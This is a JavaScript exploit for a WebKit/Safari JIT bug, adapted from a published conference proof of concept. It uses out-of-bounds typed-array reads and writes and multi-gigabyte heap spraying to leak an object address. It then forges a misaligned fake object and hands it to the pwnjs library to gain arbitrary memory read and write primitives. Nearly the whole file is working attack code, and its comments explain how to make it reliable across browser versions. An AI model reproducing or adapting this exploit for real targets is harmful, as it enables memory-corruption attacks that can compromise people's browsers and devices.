// Original exploit from singi @ Theori : https://github.com/theori-io/zer0con2018_singi
// Improved version by Externalist. Saw lots of room for improvement so did a complete Facelift. Enhanced reliablity, removed all offset dependencies to make it compatible with various browser versions, used a different exploitation technique, created pwnjs webkit prototype, Took care of process continuation, Made the code clean & concise & verbose, etc etc...

var Exploit = (function() {
    var WebkitExploit = pwnjs.WebkitExploit,
        Integer = pwnjs.Integer

    function Exploit() {
        WebkitExploit.call(this);

        var reference_index = -0x7c000000;              // Value that worked best for me. It attempts to index backwards but strangely, when applied to ArrayBuffers, it actually indexes forward by a whooping 0x400000000 bytes(16 gigs)! We can slash that to half(0x200000000 - 8 gigs) by referencing the biggest negative number possible.
        negative_index_array = new Uint32Array(0x10);   // For some odd reason, putting a 'var' in front of this will break the bug trigger
        var gigabyte_spray_arrays = [];
        var jit_function = new Function();
        
        function log(str) {
            document.write('<b style="font-size:150%;">[*] ' + str + '</b> <br />');
        }

        function relative_read(index){
            jit_function = new Function(`
                var reference_array = negative_index_array;
                for (var i=0; i<0x100000; ++i) parseInt();
                reference_array[1];

                var retval = reference_array[` + (reference_index + index) + `];
                return retval;`);

            return jit_function();
        }

        function relative_write(index, value){
            jit_function = new Function(`
                var reference_array = negative_index_array;
                for (var i=0; i<0x100000; ++i) parseInt();
                reference_array[1];

                reference_array[` + (reference_index + index) + `] = ` + value + `;`);

            jit_function();
        }

        // This is going to spray 8 gigabytes on the Safari Memory. This is to push the subsequent allocations 8 gigabytes further away from 'negative_index_array'.
        for(var i=0; i<4; i++) {
            gigabyte_spray_arrays[i] = new Uint8Array(0x7fffff00);
        }
        this.dgc();  // I don't know why but sometimes, the allocation would be 'scheduled' to happen in the future and mess up the allocation order(I thought everything happens in a single thread apart from GC & JIT compiling & Workers & Asynchronous stuff...?). This is to just make sure that the 8 gigabyte allocation precedes the sprayed arrays.

        // Spray a bunch of target arrays
        spray_count = 0x400000;
        var spray_arrays = new Array(spray_count);
        spray_arrays.fill(0);      // To pre-allocate the Array, otherwise it would try to grow continously and create interfering allocations
        // Spraying a 60 element array is enough to create lots of 60MB space "cusion" in order to avoid the unmmapped holes inbetween (which would induce a crash if the relative read unluckily lands there)
        for(var i=0; i<spray_count; i++) {
            spray_arrays[i] = [ 0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object, 
                                0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object, 
                                0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object, 
                                0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object, 0x13371337, i, this.misalign_object ];
        }

        var leet_index, spray_array_relative_index, object_index;
        var spray_array_index;
        var object_addr_low, object_addr_high;
        for(var i=0; i<10; i++){
            var leaked_value = relative_read(i*2);
            if(leaked_value == 0x13371337){
                leet_index = i*2;
                break;
            }
        }

        spray_array_relative_index = leet_index + 2;        // index & object is always behind 0x13371337 even in the last element
        object_index = leet_index + 4;

        spray_array_index = relative_read(spray_array_relative_index);  // I pegged the index in there so that I only have to search in a one-dimensional array
        object_addr_low = relative_read(object_index);      // Retrieving the absolute address of 'this.misalign_object'
        object_addr_high = relative_read(object_index+1);
        relative_write(leet_index, 0x41414141);             // Modifying one of the 0x1337 in the array

        // Searching through the array to find which 0x1337 was modified
        var idx1 = spray_array_index, idx2;
        for(var i=0; i <spray_arrays[idx1].length; i++){
            if(spray_arrays[idx1][i] == 0x41414141){
                idx2 = i+2;
                break;
            }
        }

        relative_write(object_index, object_addr_low + 0x10);   // Misalign yo, the de facto trick
        var fake_object = spray_arrays[idx1][idx2];

        // Don't let the GC monster get ya! :D
        spray_arrays[idx1][idx2] = 0;

        // Setup arbitrary read/write primitives. All you need to do is provide the misaligned object and the prototype take cares of the rest
        this.initWebkit(fake_object);
        fake_object = 0;    // just in case
    }
    Exploit.prototype = Object.create(WebkitExploit.prototype);
    Exploit.prototype.constructor = Exploit;

    // No need to define these. The 'WebkitExploit' prototype does it for you!
    // Exploit.prototype.read = function (address, size) {};
    // Exploit.prototype.write = function (address, value, size) {};
    return Exploit;
})();
